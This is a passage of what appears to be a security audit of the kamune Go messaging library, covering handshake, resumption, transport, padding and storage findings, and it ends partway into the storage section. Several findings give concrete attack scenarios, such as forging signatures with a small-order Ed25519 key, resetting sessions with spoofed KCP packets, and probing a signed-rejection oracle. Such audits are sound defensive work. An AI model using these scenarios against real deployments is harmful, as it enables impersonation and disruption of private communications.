**Verifier prompts wait 2 minutes inside a 30 s handshake deadline; a late Accept stores the peer as trusted**

Severity: Medium · Category: ux-safety · Also affects: daemon, bus, tui

Locations: `server.go:146-148`, `server.go:203`, `server.go:217`, `server.go:350`, `dial.go:72`, `dial.go:123` and 22 more

The verifier runs inside the core handshake. server.serve sets a 30 s deadline on the connection before Exchange (server.go:146), and Dialer.handshake does the same (dial.go:72). Neither side offers an option to change the 30 s timeout. The bus verifier blocks for up to verificationTimeout = 2 minutes, and the daemon uses verifTimeout = 2 minutes. If the user takes more than about 30 s to compare fingerprints out of band, the deadline expires. Accept then returns nil, the verifier stores the peer (StorePeer and refreshPeersCache) for an unknown peer in Strict or Quick, restores the previous status, and the core's next write (sendIntroduction or requestHandshake) fails with an i/o timeout. The dialog is not closed when the connection dies. The user sees a failed connection, but the remote key is now a trusted known peer that Quick mode will accept silently next time. The dialer's deadline also covers the time the responder's user spends verifying, so the two users share one 30 s budget. The README tells users to compare emoji 'through a separate secure channel' and recommends Strict mode for sensitive use.

The daemon behaves the same way: after the connection is gone it logs "Accepted peer", calls store.StorePeer and returns status ok to verify_response (cmd/daemon/verifier.go:132-144, 212-226), while DAEMON.md:1756 promises a 2-minute window. In TUI server mode the failure is only logged and the UI stays on "Listening on" (cmd/tui/welcome.go:240-243).

**Attack scenario.** Alice reads Bob's fingerprint over a phone call and accepts after 40 s. The handshake fails with a deadline error and Bob's key is now stored as accepted. Users learn to click accept quickly, which helps a MITM presenting its own key.

**Recommendation.** Align the timeouts: add a core option to clear the handshake deadline before calling remoteVerifier and re-arm it afterwards, or pass a context or the remaining deadline to RemoteVerifier and close the dialog when it fires. Store the peer only after the handshake completes. Limit concurrent pending verifications.

<details><summary>Evidence</summary>

```text
server.go:146-148 `cn.SetDeadline(time.Now().Add(s.handshakeOpts.timeout))`; server.go:150 `timeout: 30 * time.Second`; server.go:203 `s.handshakeOpts.remoteVerifier(s.storage, peer)`; dial.go:72 `_ = cn.SetDeadline(time.Now().Add(d.handshakeOpts.timeout))`; cmd/bus/verifier.go:169 `const verificationTimeout = 2 * time.Minute`; cmd/daemon/verifier.go:13 `const verifTimeout = 2 * time.Minute`.
```

</details>

#### KAM-08

**Resumption skips RemoteVerifier, so Strict mode in bus, daemon and TUI does not prompt for resumed sessions**

Severity: Medium · Category: spec-drift · Also affects: daemon, bus, tui

Locations: `server.go:174-180`, `server.go:243-319`, `server.go:353`, `cmd/bus/verifier.go:19-20`, `cmd/bus/verifier.go:77-79`, `cmd/bus/network.go:228` and 14 more

NewServer turns resumption on by default (resumeEnabled: true). handleResume skips remoteVerifier entirely. Neither bus nor daemon passes ServeWithResumeEnabled(false) in Strict mode. In Strict mode the verifier stores the peer after the first approval (cmd/bus/verifier.go:77-79), so within the next 24 h that peer can reconnect through ResumeRequest with no dialog. The bus README says Strict 'Always shows a verification dialog for every connection', and DAEMON.md says 'Strict (always prompt)'. Neither document mentions the resumption exception.

DAEMON.md:831 defines mode 0 as "Strict (always prompt)" with no resumption exception, and the daemon reconnects with DialWithResume (cmd/daemon/network.go:1122-1124). The TUI does not disable resumption either. Its chat view shows only the session ID and labels every inbound line "Peer:" (cmd/tui/tea.go:478, 622), so a resumed session gives no sign of who connected.

**Attack scenario.** A user in Strict mode approves peer X once, possibly by mistake or for a device later reported stolen. Over the next 24 h, X (or anyone holding X's DB and passphrase) drops the connection and redials with DialWithResume, which bus does automatically on any involuntary disconnect. The server accepts the signed ResumeRequest and calls the handler. The user is never asked, although they configured the mode that promises a prompt on every connection.

**Recommendation.** When the verification mode is Strict, build the server with kamune.ServeWithResumeEnabled(false) in bus and daemon, or run the verifier on the resume path for Strict. Otherwise, correct both documents to say that resumed sessions within 24 h skip the prompt, and give users a way to revoke tokens for a peer.

<details><summary>Evidence</summary>

````text
server.go:174-180:
```
case RouteResumeRequest:
    if !s.resumeEnabled { ... }
    return s.handleResume(cn, ec, st)
```
server.go:353: `resumeEnabled: true,`
grep for ServeWithResumeEnabled in cmd/: no matches.
cmd/bus/README.md:136: `| **Strict** | Always shows a verification dialog for every connection |`
docs/DAEMON.md:831: `Modes: 0 = Strict (always prompt)`
````

</details>

#### KAM-09

**Bucketed padding emits off-bucket sizes (target-1, target-2), revealing exact envelope size**

Severity: Low · Category: privacy

Locations: `serde.go:149-168`, `kamune.go:62-69`, `docs/SPEC.md:1354-1360`, `serde_test.go:102-145`

padSignedTransport (serde.go:149-168) cannot reach the bucket target when the gap target-baseSize is 1, 2, 130 or 16387. The Padding field is protobuf field 4 with a 1-byte tag, so it costs 1+varint(len)+len bytes. A padLen of 0 is not serialized. Gaps of 130 and 16387 fall between varint widths, so the loop ends one byte short. The output is target-1 or target-2 for every bucket: 510/511, 1022/1023, 4094/4095, 16382/16383, 32766/32767 and 65493/65494. The base sizes behind these are 382, 894, 3966, 16254, 32638, 49108 and 65365, plus 16381 when it is bumped to the 32 KiB bucket. This breaks the SPEC 12.7 MUST and gives the exact unpadded size for these values.

**Attack scenario.** A passive observer (A1) records frame lengths. A 511-byte envelope means the base size was 382 or 511; 32767 means 16381, 32638 or 32767. This narrows message length for a set of sizes.

**Recommendation.** When no padLen hits the target, move to the next bucket, or pad with a fixed-width field so every gap of 5 bytes or more is reachable. Add a test that every base size in [0, frameTargetSize) lands exactly on a bucket.

#### KAM-10

**Server signs a ResumeAccept for any unauthenticated client, giving an identity-confirmation oracle**

Severity: Low · Category: privacy

Locations: `server.go:242-264`, `server.go:322-327`, `resume.go:96-140`, `resume.go:14-54`

On the cold path the server sends its signed Introduce only after the remote verifier accepts the client (server.go:203-207). On the resume path, which is on by default, any client that completes the anonymous HPKE and sends a ResumeRequest with an arbitrary session ID gets ResumeAccept{Accepted:false} signed with the server's Ed25519 key. rejectResume calls sendResumeAccept before any lookup succeeds, including for 'unknown session' (server.go:259, 263). The signed bytes are fixed (metadata holds only the route; data is the constant {false, "resumption not available"}), so a scanner can check the signature against candidate public keys without passing Strict verification. The lookup also returns before signature verification, which leaves a timing difference.

**Attack scenario.** A censor scans hosts, runs exchange.Initiate on each kamune port and sends a ResumeRequest with SessionID "A" and a 32-byte token. It checks each signed rejection against a list of target keys, such as published share cards, and confirms which identity runs at that IP with no prompt shown.

**Recommendation.** For requests that fail before the initiator's signature is verified (unknown session, bad length, malformed), close the connection or send an unsigned reject. Sign a reply only after the initiator's signature verifies against the stored key. Put the session ID and a request hash or HPKE exporter value in ResumeAccept.

#### KAM-11

**KCP runs with no FEC and no packet authentication; spoofed UDP creates pre-auth sessions and resets live ones**

Severity: Low · Category: dos

Locations: `server.go:404`, `dial.go:268`, `cmd/bus/directp2p.go:59`, `cmd/bus/p2plistener.go:132`, `cmd/daemon/directp2p.go:51`, `cmd/daemon/p2plistener.go:103` and 1 more

SPEC 9.2 claims Reed-Solomon FEC, but every KCP path uses nil BlockCrypt and 0/0 shards. Without packet authentication, a spoofed datagram with a different conv and sn==0 from the peer's IP:port makes kcp-go close the listener-side session (ErrConnClosed via io.ErrClosedPipe at transport.go:86-88). The dialer side stalls instead of closing at once. P2P listeners accept KCP from any source.

**Attack scenario.** Users pick UDP for lossy links expecting FEC and get plain ARQ. An off-path attacker without source-address validation who knows Alice's public IP:port (the broker reveals it to static-token holders) sends one 24-byte KCP header to Bob's port with src=Alice, conv=1, sn=0. Bob's session closes and both transports see ErrConnClosed.

**Recommendation.** Use ListenWithOptions/DialWithOptions with explicit shards (for example 10/3) and a per-session BlockCrypt keyed after rendezvous, or remove the FEC claim from SPEC 9.2. Filter direct-P2P sessions to the expected peer address and cap pending KCP sessions.

#### KAM-12

**Transport.Close can block for about 2 minutes behind a stalled Send**

Severity: Low · Category: dos

Locations: `transport.go:158-173`, `transport.go:177-183`, `conn.go:152-155`, `conn.go:302`, `cmd/daemon/network.go:878-882`, `cmd/bus/network.go:375-377` and 1 more

Send holds sendMu while it writes, and every write re-arms a 1-minute deadline. Close calls Send(RouteCloseTransport), so it waits behind any in-flight Send. Then its own frame write can block for up to another minute before conn.Close runs. A peer that stops reading, for example while it floods pings that the local receive loop answers with pongs, can keep Close blocked for about 2 minutes. Bus StopServer and ServiceShutdown close sessions serially. The daemon handles close_session on its stdin command loop, so every daemon command waits too.

**Attack scenario.** An authenticated peer stops reading from its socket. The local user's Disconnect blocks on Transport.Close until both write deadlines expire.

**Recommendation.** Write the close frame under a short explicit deadline (for example 2 s) or try sendMu with a timeout, then close the conn unconditionally.

#### KAM-13

**A receive timeout in the middle of a frame desyncs the stream, but SPEC 14 calls it non-fatal and all three clients retry**

Severity: Low · Category: correctness

Locations: `conn.go:79-93`, `conn.go:136-148`, `transport.go:82-93`, `docs/SPEC.md:1426`, `cmd/daemon/messaging.go:176-177`, `cmd/bus/messaging.go:95-96` and 5 more

conn.ReadBytes sets one deadline in readLenLocked and then calls io.ReadFull for the 2-byte prefix and for the body (conn.go:83-90, 137-148). If the deadline fires after the prefix or part of the body has arrived, those bytes are consumed and thrown away. ReceivePayload maps the error to ErrReceiveTimeout (transport.go:89-90). SPEC 14 says a read-deadline expiry is 'Non-fatal; the caller may retry', and daemon, bus and tui all `continue` on ErrReceiveTimeout. The next ReadBytes reads body bytes as a length prefix, so decryption fails or the read blocks waiting for a wrong length. The session then ends with a generic 'Receive error' instead of a reconnect. The code has a TODO acknowledging this (conn.go:69-70).

**Attack scenario.** A large frame starts arriving just before the 5-minute default read deadline over a slow KCP or TCP link. Alternatively, an on-path attacker delays the TCP segments that follow a frame's length prefix. The timeout fires mid-frame and the client retries. The next read decrypts garbage and the session is torn down without the resumption path that ErrConnClosed would trigger.

**Recommendation.** Treat a timeout after any byte of a frame has been read as fatal: close the conn and return ErrConnClosed. Alternatively, keep the partial read state across calls. Update SPEC 14 to limit 'non-fatal' to timeouts that occur before any byte of the next frame has arrived.

#### KAM-14

**Connection resets and mid-frame EOF are not mapped to ErrConnClosed, which bypasses client reconnection**

Severity: Low · Category: correctness

Locations: `transport.go:82-93`, `conn.go:83-91`, `conn.go:141-145`, `cmd/bus/messaging.go:84-101`, `cmd/daemon/messaging.go:166-181`

ReceivePayload maps only io.EOF, net.ErrClosed and io.ErrClosedPipe to ErrConnClosed. A TCP reset (ECONNRESET) and a peer that closes mid-frame (io.ErrUnexpectedEOF from io.ReadFull) come back as a generic 'reading payload' error; errors.Is(io.ErrUnexpectedEOF, io.EOF) is false. SPEC 6.6 says a dropped connection surfaces as connection-closed. Bus and daemon start transparent resumption only on ErrConnClosed, so these drops end the session.

**Attack scenario.** The remote host aborts the connection (RST after a crash, a NAT reset) or the link drops mid-frame. The client logs 'connection reset by peer' and tears the session down instead of resuming.

**Recommendation.** Also map syscall.ECONNRESET, syscall.EPIPE and io.ErrUnexpectedEOF to ErrConnClosed. Add tests with a real TCP RST and a truncated frame.

#### KAM-15

**Lost final challenge echo desynchronizes resumption token sets; later resumes always fail**

Severity: Low · Category: correctness

Locations: `handshake.go:135-142`, `handshake.go:245-260`, `handshake.go:276`, `dial.go:181-188`, `server.go:296-307`, `transport.go:218-238` and 2 more

In requestHandshake the dialer's last action is the challenge echo write (handshake.go:135). It then returns established and attemptResume persists a new token set. The server persists its new set only after reading that echo (server.go:307). If the echo is lost, or the server's earlier-started 30 s deadline fires first, the dialer holds tokens from session k+1 and the server holds session k's tokens minus the one used. Every later ResumeRequest fails with 'token invalid' until a cold Introduction. Concurrent resumes of the same session, or Close() on a stale transport sharing the session ID, also overwrite or wipe the set. RFC001 section 5 says the scheme has no such dependency on synchronization.

**Attack scenario.** A network drop or slow relay right after the dialer's final echo. Sandbox repro dropped the dialer's 6th write: first resume succeeded on the dialer and failed on the server; second resume failed with `server err=resume rejected: token invalid`. A relay can do this on purpose by dropping one frame, forcing a full Introduction and a new verification prompt.

**Recommendation.** Keep the previous token set until the new session is confirmed: the dialer replaces it only after the first post-handshake frame from the server, or the server accepts tokens from current and previous generation. Tag token sets with a generation so a stale Transport cannot clear a newer set.

#### KAM-16

**Transport close re-creates a deleted session bucket**

Severity: Low · Category: correctness

Locations: `transport.go:139`, `transport.go:180`, `transport.go:203`, `pkg/storage/session.go:122`, `pkg/storage/storage.go:204`, `pkg/storage/storage.go:482` and 3 more

invalidateResumptionTokens (transport.go:203) writes an empty resumption_tokens list through SetMeta. SetMeta uses sessionMetaEnsure (storage.go:204-209), which creates sessions/&lt;id&gt;/meta when it is missing. Bus DeleteHistorySession (app.go:1373) and daemon delete_history_session (history.go:298) delete a session without checking whether it is still live. When that session later closes, either locally through Transport.Close or when the peer sends RouteCloseTransport, the session bucket is re-created. ListSessionsByRecent then lists it with 0 messages. Bus DisconnectSession reloads history right after Close, so the entry reappears at once. Only the random session ID and an encrypted empty token list come back. The established_at time is not restored.

**Attack scenario.** A user deletes a conversation from history while it is still connected, to remove the trace. When the peer disconnects, the session ID reappears in the history list as an empty entry, and its creation time is visible in the plaintext bucket names. The peer controls when this happens by sending close.

**Recommendation.** For invalidation, use a write path that does not create namespaces, such as Sub plus Delete or Put, and ignore ErrMissingNamespace. Alternatively, have DeleteSession refuse active sessions, or have callers close the live session first.

#### KAM-17

**Transport.Close leaves local resumption tokens on disk when the close frame cannot be sent**

Severity: Low · Category: correctness

Locations: `transport.go:177-183`, `transport.go:203-216`, `cmd/tui/tea.go:672`, `cmd/bus/network.go:375-377`, `cmd/bus/app.go:452-454`

Close invalidates local resumption tokens only if Send(RouteCloseTransport) succeeds. If the link is already broken, tokens and established_at stay on disk for the 24 h window, and the peer, which never got the close frame, can still resume against this node's server. SPEC 6.6 and 6.8.1 require invalidation on any intentional close. Bus DisconnectSession (cmd/bus/network.go:852-858) and daemon close_session (cmd/daemon/network.go:870-876) clear the tokens themselves, so the gap affects tui, library users, and the bus and daemon StopServer and shutdown paths.

**Attack scenario.** A user closes a session while the link is down. A stolen-disk attacker with the passphrase, or the app's auto-reconnect path, can resume that session for up to 24 h if the peer still holds its tokens.

**Recommendation.** Call t.invalidateResumptionTokens() in Close regardless of the Send result.

#### KAM-18

**Concurrent Receive calls produce spurious ErrOutOfSync and kill the session**

Severity: Low · Category: concurrency

Locations: `transport.go:81-128`, `conn.go:79-93`, `pkg/relayconn/token.go:233-255`

Transport.ReceivePayload is not safe for concurrent callers. ReadBytes serializes only the frame read (conn.go:80-81). The sequence check runs afterwards under Transport.mu (transport.go:108-125). Two goroutines can read frames N and N+1 in wire order and then reach the check in reverse order. The one holding N+1 sees a gap, closes the conn and returns ErrOutOfSync. Send is documented and built to be concurrency-safe (transport.go:155-159). Receive has no stated single-reader rule. In-tree apps use one reader, so nothing in the repo triggers this. Running DeriveRelayTokens next to a receive loop is broken for another reason too: the loop can consume the SessionData reply.

**Attack scenario.** An application calls DeriveRelayTokens while its main receive loop runs. Under load the session ends with 'peers are out of sync: missing messages'.

**Recommendation.** Hold one receive mutex across ReadBytes, decrypt, verify and the sequence update, or document and enforce single-reader use.

#### KAM-19

**Server.Close does not stop or wait for in-flight handshakes and handlers**

Severity: Low · Category: concurrency

Locations: `server.go:104-108`, `server.go:115-129`, `server.go:203-236`, `cmd/bus/network.go:350-387`, `cmd/bus/network.go:880-930`

Close only closes the listener and sets s.closed. Per-connection serve goroutines are not tracked or cancelled. A handshake in progress, including a verifier prompt, still completes and calls handlerFunc after Close returns. Bus StopServer clears a.sessions after server.Close(), and a late serverHandler then adds a live session to the stopped server.

**Attack scenario.** A peer starts a handshake just before the user clicks Stop Server. It finishes seconds later and a session appears with messages flowing while the UI shows the server stopped.

**Recommendation.** Track active connections (map plus sync.WaitGroup). Close should close pending handshake conns, serve should check s.closed under the mutex before handlerFunc, and add Shutdown(ctx).

#### KAM-20

**Every connection persists a new session record with 20 tokens, so a peer can grow the DB and history list without bound**

Severity: Low · Category: resource-leak

Locations: `server.go:226`, `transport.go:218-238`, `pkg/storage/session.go:55-97`, `pkg/storage/storage.go:344-377`, `pkg/storage/peer.go:83-91`, `cmd/bus/network.go:914-919` and 2 more

Each cold handshake creates a new random session ID. persistEstablishedSession writes sessions/&lt;id&gt;/meta with the peer key, established_at and 20 tokens, and bus and daemon also call CreateSession and store relay tokens. Nothing prunes old or empty sessions. ListSessionsByRecent walks every session on each session close (loadHistorySessions), and every record appears in history. In Quick mode a known peer needs no user interaction to reconnect in a loop.

**Attack scenario.** A known peer runs connect-handshake-close at about 10/s: about 864k namespaces per day at 1 KB or more each, with an O(n) rescan on every close that slows the bus and buries real history.

**Recommendation.** Persist the session record only after the first application message, expire sessions past the resumption window with no chat entries, and rate-limit new sessions per peer key.

#### KAM-21

**NewServer leaks the bound TCP/KCP listener when a later option or Attester() fails**

Severity: Low · Category: resource-leak

Locations: `server.go:355-364`, `server.go:388-410`, `cmd/daemon/network.go:231-245`, `cmd/bus/network.go:221-228`, `server.go:356-372`, `server.go:388-411`

ServeWithTCP and ServeWithUDP bind the socket inside the option function. NewServer returns without closing s.listener when a later option fails or when s.storage.Attester() fails (server.go:356-364). With TCP, the orphaned listener stays bound only until the next GC, because Go's netFD finalizer closes it, and Go forces a GC at least every 2 minutes. With UDP/KCP, kcp-go's serveConn starts `go l.monitor()`, which keeps the listener reachable. The UDP port and the goroutine then leak until the process exits, and every later start_server with transport udp on that port fails. In the daemon (network.go:231-245) and bus (network.go:221-228), the bind option is appended last. The only practical trigger is an Attester() error after storage is open, such as a DB read error or a corrupt identity record.

**Attack scenario.** A start_server call fails because the identity cannot be loaded, for example after a transient DB read error. The daemon's TCP port stays bound to a socket that nothing accepts on. Clients' TCP connects complete into the backlog and then hang, and every later start_server on that port fails until the daemon restarts.

**Recommendation.** In NewServer, close s.listener when any later option or Attester() fails. Alternatively, defer binding until ListenAndServe.

#### KAM-22

**Remote Introduce name has no length or character limits**

Severity: Low · Category: input-validation

Locations: `intro.go:87-91`, `pkg/storage/peer.go:93-131`, `cmd/bus/app.go:723-727`, `cmd/daemon/history.go:433-438`, `cmd/tui/welcome.go:274-278`, `conn.go:79-92`

receiveIntroduction copies the remote Introduce.Name unchanged. Its only bound is the 64 KiB frame (a uint16 length prefix). The name may contain newlines, ANSI and C0/C1 controls, and bidi or zero-width code points. The bus (app.go:723-727) and the daemon (history.go:433-438) limit only the local name to 32 bytes. Verifiers store the remote name in the peers DB and pass it into status lines, logs and verify dialogs. The TUI verify view (welcome.go:274-278) renders it raw. This allows name spoofing and inflated stored peer records.

**Attack scenario.** A remote sends Name="Bob‮" plus padding, or a 60 KB name. The verify dialog and peer list render a misleading or oversized label, and the stored peer record holds attacker-chosen bulk data.

**Recommendation.** Validate the name in receiveIntroduction: valid UTF-8, at most 64 bytes, no C0/C1 controls or bidi overrides, normalized. Reject or replace before the verifier runs.

#### KAM-23

**Small-order Ed25519 identity keys are accepted; one signature then verifies every message**

Severity: Low · Category: input-validation

Locations: `pkg/attest/attest.go:72-95`, `intro.go:80-85`, `pkg/storage/peer.go:34`

parsePublicKey only checks that the PKIX key is Ed25519 with 32 bytes. Go's ed25519.Verify is cofactorless and accepts small-order points such as the identity (0x01 followed by 31 zero bytes). For that key, R = identity and S = 0 verifies for every message. A peer can introduce such a key and anyone can later forge Introduce, handshake and session signatures for it. Non-canonical encodings are also accepted, so one point maps to several peer IDs (SHA3-512 of the DER).

**Attack scenario.** An attacker introduces the identity-point key as 'support'. The victim accepts once. Any third party can later connect as that stored peer, and Quick mode auto-accepts it.

**Recommendation.** Reject small-order and non-canonical keys in parsePublicKey and IsValidPublicKey, for example with filippo.io/edwards25519 (reject if 8*P is identity or re-encoding differs).

#### KAM-24

**ReceivePayload leaves the connection open after AEAD or signature failure and after RouteCloseTransport**

Severity: Low · Category: spec-drift

Locations: `transport.go:95-103`, `transport.go:130-141`, `docs/SPEC.md:289`, `docs/SPEC.md:1427`, `cmd/bus/messaging.go:170-173`, `cmd/bus/network.go:1034-1044`

SPEC 14 says a signature failure terminates the connection, and SPEC 5.1 says that on ROUTE_CLOSE_TRANSPORT the receiver MUST close the session and process no further messages. ReceivePayload returns errors for decrypt and verify failures without closing t.conn. On CloseTransport it invalidates tokens and returns ErrPeerDisconnected but leaves the conn open. Only sequence and unexpected-route failures close the conn.

**Attack scenario.** A library caller that keeps calling Receive after ErrPeerDisconnected accepts more frames after a graceful close. A relay injecting garbage frames causes decrypt errors without closing the session.

**Recommendation.** Close t.conn and set a terminal state on decrypt or verify failure and on CloseTransport, and return a sticky error from later Receive and Send calls.

#### KAM-25

**AppVersion doc says sub-modules may override it in init(), but localSemver is fixed at kamune init**

Severity: Info · Category: correctness

Locations: `version.go:10-22`, `version.go:53-78`, `intro.go:22`, `server.go:207`, `dial.go:92`

The comment says sub-modules may override AppVersion 'via ldflags or init() before package init'. An imported package's init runs before the importer's, so a dependent init() override happens after localSemver is parsed. Introduce then advertises the new string while checkVersion compares against the stale value, and an invalid override is never validated locally. ldflags works. No module overrides it today.

**Recommendation.** Parse AppVersion lazily in checkVersion and validate in sendIntroduction, or make it a constant and fix the comment.

#### KAM-26

**Pseudonym listed as a fingerprint format but has 29.6 bits and wrong doc counts**

Severity: Info · Category: ux-safety

Locations: `pkg/fingerprint/pseudonym.go:9`, `pkg/fingerprint/pseudonym.go:45`, `pkg/fingerprint/pseudonym.go:77-78`, `docs/SPEC.md:109`

This is documentation drift only. SPEC.md:109 lists pseudonym as a fingerprint format, but no client uses it for verification. pseudonym.go:79-86 is used only as a default local or peer display name, at cmd/bus/app.go:615, network.go:86,522, peers.go:81 and cmd/daemon. The comments say ~150 adjectives and ~150 nouns, giving about 334M combinations. The real lists hold 221 adjectives and 171 nouns, giving 221*221*171*99 = 8.27e8 combinations (29.6 bits). Fix the comments and remove pseudonym from the SPEC fingerprint list. Name spoofing through Introduce.Name does not depend on Pseudonym.

**Recommendation.** Remove pseudonym from the SPEC fingerprint list and label it as a nickname in UIs. Never show a remote-supplied Name in the style of key-derived values. Fix the counts in pseudonym.go:9,45,77-78.

#### KAM-27

**Challenge receiver never recomputes the challenge, so the transcript-hash binding claimed in SPEC is not verified**

Severity: Info · Category: spec-drift

Locations: `handshake.go:286`, `handshake.go:294-311`, `handshake.go:349-387`, `docs/SPEC.md:653-654`, `docs/SPEC.md:658-661`, `docs/SPEC.md:979-980`

acceptChallenge echoes the received challenge without deriving or comparing the value it expects. The transcript hash therefore changes only the value of the sender's own opaque challenge, and neither side checks that the peer computed the same hash. All current transcript fields (Key, Salt, SessionKey) already feed the AEAD keys or sessionID, and the handshake messages are signed. As a result the transcript hash adds no property beyond key confirmation. SPEC 6.4 and 7.3 say it prevents replay and downgrade. That claim is doc drift with no exploit today.

**Recommendation.** In acceptChallenge, derive the peer's expected challenge with the opposite direction label and compare with subtle.ConstantTimeCompare before echoing. Include both identity keys and an Exchange transcript hash in handshakeTranscriptHash. Otherwise describe the step in SPEC 6.4/7.3 as key confirmation only.

#### KAM-28

**Resumption window never resets on resume; fresh tokens expire 24h after the first cold handshake**

Severity: Info · Category: spec-drift

Locations: `server.go:276`, `server.go:307`, `dial.go:188`, `pkg/storage/session.go:151`, `docs/SPEC.md:849`, `docs/SPEC.md:854`

SPEC 6.8.1 says a resumed session derives a fresh token set on reaching Established and that tokens expire 24 hours from the session's Established timestamp. Both resume paths call persistEstablishedSession with setEstablished=false, and PutSessionResumption keeps the existing established_at. handleResume compares against that original value, so regenerated tokens are rejected 24 hours after the original cold session. The code comment says this is intentional, but the spec does not.

**Recommendation.** Refresh established_at when a resumed session completes, or state in SPEC 6.8.1 and RFC001 that the window is anchored to the first cold establishment.

#### KAM-29

**golang.org/x/crypto v0.54.0 carries four known advisories in all five modules; none reachable**

Severity: Info · Category: build

Locations: `go.mod:10`, `cmd/relay/go.mod:27`, `cmd/daemon/go.mod:25`, `cmd/tui/go.mod:44`, `cmd/bus/go.mod:32`

govulncheck reports 0 reachable vulnerabilities in every module and 4 module-level advisories: GO-2026-6355 and GO-2026-6354 (ssh, fixed in v0.56.0), GO-2026-6303 (ssh, fixed in v0.55.0) and GO-2026-5932 (openpgp unmaintained). Kamune does not import x/crypto/ssh or openpgp. All modules pin x/crypto v0.54.0.

**Recommendation.** Bump golang.org/x/crypto to v0.56.0 or later in the root and each sub-module and run go mod tidy.

#### KAM-30

**Lint and test tooling run a narrow set of checks: govet limited to fieldalignment, no -race, no CI**

Severity: Info · Category: build

Locations: `.golangci.yaml:4-7`, `Makefile:2-3`, `Makefile:5`, `cmd/relay/Makefile:7-8`

.golangci.yaml limits the golangci-lint govet linter to fieldalignment, so its copylocks, printf and lostcancel analyzers never run. The other standard v2 linters (errcheck, ineffassign, staticcheck, unused) are still on by default. The config mainly serves `make align-structs`. Neither `make test` nor cmd/relay `make test` uses -race, and the root target covers only the root module. FUZZ_TIME defaults to 10s. No CI config exists, so nothing runs the documented `go vet ./...` automatically.

**Recommendation.** Remove govet disable-all or list the defaults plus fieldalignment. Add -race to `make test` and loop over all five modules. Add CI running go vet, go test -race, staticcheck and govulncheck per module.

#### KAM-31

**Handshake, transport and storage failure paths have no tests; fuzzers only produce validly signed input**

Severity: Info · Category: test-gap

Locations: `handshake.go:75`, `handshake.go:92`, `handshake.go:166`, `handshake.go:183`, `handshake.go:286`, `transport.go:96` and 10 more

No test reaches these branches: the handshake route mismatch (handshake.go:75, 166), the resumed session-ID mismatch (92, 183), the challenge mismatch (286), the AEAD failure in ReceivePayload (transport.go:96), the duplicate sequence (transport.go:116), the invalid signature in serde.verify (serde.go:93), the error on reopen with a wrong passphrase (bolt_store.go:80), and decrypting tampered values (bolt_namespace.go:121, 138). DeriveRelayTokens, DialRelay and ListenRelay have 0% coverage. FuzzTransportReceiveEnvelope signs and encrypts every input with valid keys. FuzzPreAuthEnvelopeValidation tampers signatures but builds the struct directly. Neither fuzzer feeds raw wire bytes to Decrypt, serve or handleResume.

**Recommendation.** Add table-driven negative tests for each branch, a raw-bytes fuzzer for Transport.ReceivePayload and Server.serve over a pipe, a WS relay round trip across all padding buckets, and a wrong-passphrase reopen test.

#### KAM-32

**Resume rejection tests reimplement server logic in the wrong order and never run handleResume reject paths**

Severity: Info · Category: test-gap

Locations: `resume_test.go:361`, `resume_test.go:469`, `resume_test.go:526-529`, `resume_test.go:597`, `resume_test.go:625-659`, `server.go:174-179` and 7 more

The resume_test.go tests rebuild handleResume by hand and call RemoveListItem before signature and expiry checks, the reverse of server.go:267-284. Three server_test.go tests drive serve on the resume path: :144 (happy path), :207 (wrong signer, asserts no token is burned) and :256 (wrong-length token). Coverage still shows zero counts for malformed request (server.go:248), unknown session (259, 263), session expired (277), token not present or replayed (283-285), and resume disabled (174-179). ServeWithResumeEnabled and ServeWithClock are at 0%. A regression in expiry or single-use enforcement would pass the suite.

**Recommendation.** Drive Server.serve over net.Pipe with real stores, using ServeWithClock and ServeWithResumeEnabled(false), and assert the stored token count and the received ResumeAccept after each rejection. Add the missing lifecycle tests.

### kamune: storage

pkg/storage and internal/engine. Part of the root module; listed separately because it is the at-rest boundary.

| ID                | Severity | Category      | Finding                                                                                                                                 |
| ----------------- | -------- | ------------- | --------------------------------------------------------------------------------------------------------------------------------------- |
| [STO-01](#sto-01) | High     | crypto        | DB passphrase is stretched only by HKDF-SHA512, so a stolen DB allows fast offline guessing                                             |
| [STO-02](#sto-02) | Medium   | security      | Chat history is sorted by the peer-supplied Metadata.Timestamp, so a peer can reorder the stored transcript, contrary to SPEC 4.2       |
| [STO-03](#sto-03) | Medium   | crypto        | At-rest AEAD has no associated data and findPeer does not check the claim, so an offline record copy makes an attacker key a known peer |
| [STO-04](#sto-04) | Medium   | privacy       | Deleted history and peers stay recoverable from BoltDB free pages                                                                       |
| [STO-05](#sto-05) | Medium   | privacy       | Message timestamps, sender, lengths, session IDs, settings names and peer-key hashes are stored in plaintext despite SPEC 11.3          |
| [STO-06](#sto-06) | Low      | security      | DB directory is created 0740 and permissions on existing DB files and directories are never checked                                     |
| [STO-07](#sto-07) | Low      | crypto        | No reachable passphrase change; engine rotation is dead code that leaves the old wrapped key on disk                                    |
| [STO-08](#sto-08) | Low      | correctness   | AddChatEntry needs a prior CreateSession with a stored peer; otherwise messages are dropped                                             |
| [STO-09](#sto-09) | Low      | correctness   | Missing one cipher-metadata key silently re-keys the DB and overwrites the wrapped DEK                                                  |
| [STO-10](#sto-10) | Low      | correctness   | Peer LastSeen is never updated; UIs show the first-contact time as last seen                                                            |
| [STO-11](#sto-11) | Low      | concurrency   | Attester() creates the identity with check-then-write across two transactions; concurrent first calls diverge                           |
| [STO-12](#sto-12) | Low      | concurrency   | Peer read-modify-write spans two transactions: deleted peers can be re-created, fresh records deleted                                   |
| [STO-13](#sto-13) | Low      | resource-leak | NewBoltDB leaks the bolt handle and its file lock when bucket creation fails                                                            |
| [STO-14](#sto-14) | Info     | correctness   | SessionTimestamps claims O(1) but KeyCount walks every page of the chat bucket                                                          |

#### STO-01

**DB passphrase is stretched only by HKDF-SHA512, so a stolen DB allows fast offline guessing**

Severity: High · Category: crypto

Locations: `internal/engine/bolt_store.go:140`, `internal/engine/bolt_store.go:152`, `internal/engine/bolt_store.go:173`, `internal/engine/bolt_store.go:261`, `internal/engine/bolt_store.go:325`, `internal/enigma/enigma.go:68` and 1 more

